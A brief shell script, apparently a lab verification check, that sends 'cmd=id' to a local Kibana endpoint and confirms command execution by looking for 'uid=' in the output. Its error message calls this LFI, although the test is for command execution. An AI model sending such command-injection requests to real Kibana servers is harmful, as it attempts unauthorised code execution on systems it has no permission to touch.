set -eu
out=$(curl -fsS "http://127.0.0.1:5601/kibana/run?cmd=id")
echo "$out"
echo "$out" | grep -q 'uid=' || { echo "Kibana LFI did not execute" >&2; exit 1; }
